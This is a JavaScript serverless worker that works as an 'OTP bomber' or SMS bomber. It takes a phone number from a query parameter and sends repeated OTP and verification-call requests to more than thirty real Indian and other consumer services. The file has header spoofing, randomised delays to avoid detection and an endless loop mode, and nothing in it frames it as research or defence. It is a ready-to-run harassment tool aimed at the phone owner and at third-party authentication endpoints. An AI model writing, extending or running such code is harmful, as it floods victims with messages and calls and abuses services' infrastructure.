export default {
  async fetch(request, env) {
    const { searchParams } = new URL(request.url);
    const mobile = searchParams.get("mobile");
    const loop = searchParams.has("loop");
    const stopToken = searchParams.get("stop");
    const delay = parseInt(searchParams.get("delay")) || 3000;
    const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds random delay

    // Global bombing state management
    if (!globalThis.bombingState) {
      globalThis.bombingState = new Map();
    }

    // Stop mechanism
    if (stopToken && globalThis.bombingState.has(stopToken)) {
      globalThis.bombingState.set(stopToken, false);
      return new Response(`🚫 Bombing stopped for session: ${stopToken}`);
    }

    if (!mobile) {
      return new Response("❌ Missing 'mobile' parameter", { status: 400 });
    }

    const sessionId = crypto.randomUUID();
    const currentTime = new Date().toLocaleTimeString();

    // Complete list of all OTP APIs
    const endpoints = [
      // Samsung
      {
        url: "https://www.samsung.com/in/api/v1/sso/otp/init",
        method: "POST",
        body: { user_id: mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.samsung.com"
        }
      },
      
      // Swiggy
      {
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        body: { mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.swiggy.com"
        }
      },

      // OLX
      {
        url: "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        method: "POST",
        body: { 
          method: "call", 
          phone: `+91${mobile}`, 
          language: "en-IN", 
          grantType: "retry" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Referer": "https://www.olx.in/"
        }
      },

      // Meesho
      {
        url: "https://www.meesho.com/api/v1/user/login/request-otp",
        method: "POST",
        body: { phone_number: mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.meesho.com"
        }
      },

      // PhonePe
      {
        url: "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
        method: "POST",
        body: { 
          rmn: mobile, 
          purpose: "REGISTRATION" 
        },
        headers: { 
          "Content-Type": "application/json",
          "X-Device-Id": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1"
        }
      },

      // Doubtnut
      {
        url: "https://api.doubtnut.com/v4/student/login",
        method: "POST",
        body: { 
          is_web: "3", 
          phone_number: mobile 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.doubtnut.com"
        }
      },

      // My11Circle
      {
        url: "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        body: { 
          isPlaycircle: false,
          mobile,
          deviceId: "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
          deviceName: "",
          refCode: ""
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.my11circle.com"
        }
      },

      // Doctime
      {
        url: "https://admin.doctime.com.bd/api/otp/send",
        method: "POST",
        body: { contact: mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.doctime.com.bd"
        }
      },

      // Khatabook
      {
        url: "https://api.khatabook.com/v1/auth/request-otp",
        method: "POST",
        body: { 
          app_signature: "Jc/Zu7qNqQ2", 
          country_code: "+91", 
          phone: mobile 
        },
        headers: { 
          "Content-Type": "application/json",
          "X-Device-Id": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1"
        }
      },

      // Pharmeasy
      {
        url: "https://pharmeasy.in/apt-api/login/send-otp",
        method: "POST",
        body: { param: mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://pharmeasy.in"
        }
      },

      // PolicyBazaar
      {
        url: "https://myaccount.policybazaar.com/myacc/login/sendOtpV3",
        method: "POST",
        body: {
          SMSType: 1,
          CountryCode: "91",
          Mobile: mobile,
          OTPLogin: true,
          source: "MYACC",
          isCustReg: true,
          requestReason: "OTPLogin"
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.policybazaar.com"
        }
      },

      // Xiaomi
      {
        url: "https://in.account.xiaomi.com/pass/sendPhoneRegTicket",
        method: "POST",
        body: `region=IN&phone=%2B91${mobile}&sid=i18n_in_pc_pro`,
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://in.account.xiaomi.com"
        }
      },

      // Blinkit
      {
        url: "https://blinkit.com/v2/accounts/",
        method: "POST",
        body: `user_phone=${mobile}`,
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://blinkit.com"
        }
      },

      // BigBasket
      {
        url: "https://www.bigbasket.com/member-tdl/v3/member/otp",
        method: "POST",
        body: { 
          identifier: mobile, 
          referrer: "unified_login" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.bigbasket.com"
        }
      },

      // VijaySales
      {
        url: "https://mdm.vijaysales.com/web/api/vs-otp/generate-otp/v1",
        method: "POST",
        body: { 
          header: { 
            authToken: "", 
            type: "mobile" 
          }, 
          body: { 
            mobileNumber: `91${mobile}` 
          } 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.vijaysales.com"
        }
      },

      // Fancode
      {
        url: "https://www.fancode.com/graphql",
        method: "POST",
        body: {
          operationName: "RequestOTP",
          variables: { mobileNumber: mobile },
          query: "mutation RequestOTP($mobileNumber: String!) { requestAuthOTP(mobileNumber: $mobileNumber) { message success } }"
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.fancode.com"
        }
      },

      // Damensch
      {
        url: "https://www.damensch.com/api/notification/otp",
        method: "POST",
        body: { 
          mobileNo: mobile, 
          entityType: 1, 
          templateId: 1, 
          isChannelStore: false 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.damensch.com"
        }
      },

      // Yatra
      {
        url: "https://secure.yatra.com/social/common/yatra/sendMobileOTP",
        method: "POST",
        body: `isdCode=91&mobileNumber=${mobile}`,
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://www.yatra.com"
        }
      },

      // Healthkart
      {
        url: `https://www.healthkart.com/veronica/user/validate/1/${mobile}/signup?plt=2&st=1`,
        method: "GET",
        headers: { 
          "Referer": "https://www.healthkart.com/"
        }
      },

      // Snapdeal
      {
        url: "https://m.snapdeal.com/sendOTP",
        method: "POST",
        body: { 
          mobileNumber: mobile, 
          purpose: "LOGIN_WITH_MOBILE_OTP" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://m.snapdeal.com"
        }
      },

      // RummyCircle
      {
        url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        body: {
          isPlaycircle: false,
          mobile,
          deviceId: "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
          deviceName: "",
          refCode: ""
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.rummycircle.com"
        }
      },

      // Bewakoof
      {
        url: "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        method: "POST",
        body: { 
          mobile: mobile, 
          country_code: "+91" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.bewakoof.com"
        }
      },

      // Purplle
      {
        url: `https://www.purplle.com/neo/user/authorization/v2/send_otp?phone=${mobile}`,
        method: "GET",
        headers: { 
          "Referer": "https://www.purplle.com/"
        }
      },

      // Reliance Retail
      {
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        body: { mobile: mobile },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.reliancedigital.in"
        }
      },

      // Bajaj Electronics
      {
        url: "https://www.bajajelectronics.com/Customer/sendOTP",
        method: "POST",
        body: `phoneNumber=${mobile}`,
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://www.bajajelectronics.com"
        }
      },

      // Pepperfry
      {
        url: "https://www.pepperfry.com/api/account/auth/sentOtp",
        method: "POST",
        body: { 
          mobile: mobile, 
          mobile_country: "+91" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.pepperfry.com"
        }
      },

      // KukuFM
      {
        url: "https://kukufm.com/api/v1/users/auth/send-otp/",
        method: "POST",
        body: { 
          phone_number: `+91${mobile}` 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.kukufm.com"
        }
      },

      // Proptiger
      {
        url: "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        method: "POST",
        body: { 
          contactNumber: mobile, 
          domainId: "2" 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.proptiger.com"
        }
      },

      // Country Delight
      {
        url: "https://api.countrydelight.in/api/auth/new_request_otp",
        method: "POST",
        body: { 
          new_user: true, 
          mobile_no: mobile 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.countrydelight.in"
        }
      },

      // More Retail
      {
        url: "https://omni-api.moreretail.in/api/v1/login/",
        method: "POST",
        body: { 
          hash_key: "XfsoCeXADQA", 
          phone_number: mobile 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.moreretail.com"
        }
      },

      // Tata Digital
      {
        url: "https://api.tatadigital.com/api/v2/sso/check-phone",
        method: "POST",
        body: { 
          countryCode: "91", 
          phone: mobile, 
          sendOtp: true 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.tatadigital.com"
        }
      },

      // Fabindia
      {
        url: "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        method: "POST",
        body: { 
          mobileDailCode: "+91", 
          mobileNumber: mobile, 
          isLogin: false, 
          isSignUp: false 
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.fabindia.com"
        }
      },

      // Pantaloons
      {
        url: "https://apigateway.pantaloons.com/common/sendOTP",
        method: "POST",
        body: {
          brand: "pantaloons",
          validateHash: false,
          deviceType: "mobile",
          mobile: mobile,
          mode: "verify"
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.pantaloons.com"
        }
      },

      // Jaypore
      {
        url: "https://apigateway.jaypore.com/common/sendOTP",
        method: "POST",
        body: {
          shopId: 26,
          shopName: "Jaypore",
          device: "desktop",
          mobileoremail: mobile,
          inputType: "mobile",
          mode: "register",
          deviceId: "70c2c88f5259097ef97a81488ea0cae2"
        },
        headers: { 
          "Content-Type": "application/json",
          "Origin": "https://www.jaypore.com"
        }
      },

      // Raaga Silktales
      {
        url: "https://raagasilktales.com/ajax_function.php",
        method: "POST",
        body: `mobileOtpLoginNew=${mobile}`,
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://www.raagasilktales.com"
        }
      }
    ];

    // Execute bombing with proper headers and delays
    const executeBombing = async () => {
      const results = [];
      for (const endpoint of endpoints) {
        if (globalThis.bombingState && !globalThis.bombingState.get(sessionId)) break;
        
        try {
          const options = {
            method: endpoint.method,
            headers: {
              ...endpoint.headers,
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
              "Accept": "application/json, text/plain, */*",
              "Accept-Language": "en-US,en;q=0.9",
              "Cache-Control": "no-cache"
            },
            redirect: "follow"
          };

          if (endpoint.method !== "GET") {
            options.body = typeof endpoint.body === "string" 
              ? endpoint.body 
              : JSON.stringify(endpoint.body);
          }

          const startTime = Date.now();
          const response = await fetch(endpoint.url, options);
          const responseTime = Date.now() - startTime;

          results.push({
            url: endpoint.url,
            status: response.status,
            success: response.ok,
            time: `${responseTime}ms`
          });
        } catch (error) {
          results.push({
            url: endpoint.url,
            error: error.message,
            success: false
          });
        }
        
        // Random delay between requests
        await new Promise(resolve => setTimeout(resolve, randomDelay));
      }
      return results;
    };

    if (loop) {
      // Start continuous bombing
      globalThis.bombingState.set(sessionId, true);
      
      // Immediate response with control info
      const response = new Response(JSON.stringify({
        status: "BOMBING_STARTED",
        message: "OTP bombing initiated in loop mode",
        mobile: mobile,
        sessionId: sessionId,
        stopUrl: `${new URL(request.url).origin}?stop=${sessionId}`,
        delay: `${delay}ms between cycles`,
        randomDelay: `${randomDelay}ms between requests`,
        totalTargets: endpoints.length,
        startedAt: currentTime
      }, null, 2), {
        headers: { 
          "Content-Type": "application/json",
          "X-Bomber-Session": sessionId
        }
      });

      // Background bombing loop
      (async () => {
        let cycleCount = 0;
        while (globalThis.bombingState.get(sessionId)) {
          cycleCount++;
          await executeBombing();
          console.log(`Cycle ${cycleCount} completed for ${mobile}`);
          
          // Wait between full cycles
          await new Promise(resolve => setTimeout(resolve, delay));
        }
        globalThis.bombingState.delete(sessionId);
      })();

      return response;
    } else {
      // Single execution
      const results = await executeBombing();
      return new Response(JSON.stringify({
        status: "BOMBING_COMPLETED",
        mobile: mobile,
        results: results,
        stats: {
          totalRequests: results.length,
          successCount: results.filter(r => r.success).length,
          failureCount: results.filter(r => !r.success).length,
          averageTime: `${(results.reduce((sum, r) => sum + (r.time ? parseInt(r.time) : 0), 0) / results.length || 0)}ms`
        },
        completedAt: new Date().toLocaleTimeString()
      }, null, 2), {
        headers: { "Content-Type": "application/json" }
      });
    }
  }
};
